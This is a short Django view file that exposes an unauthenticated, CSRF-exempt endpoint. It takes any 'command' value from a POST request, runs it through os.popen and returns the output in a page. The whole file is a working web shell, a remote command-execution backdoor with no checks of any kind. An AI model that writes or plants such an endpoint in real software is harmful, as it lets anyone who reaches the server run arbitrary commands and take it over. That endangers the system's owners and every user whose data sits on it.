import os
from django.shortcuts import render
from django.views.decorators.csrf import csrf_exempt


@csrf_exempt

def command(request):
	try:
		command = request.POST['command']
		print(command)
		output = send_command(command)
		print(output)
		return render(request, 'command.html', {'output':output})
	except:
		return render(request, 'command.html')

	return render(request, 'command.html')

def send_command(command):
	stream = os.popen(command)
	return stream.read()

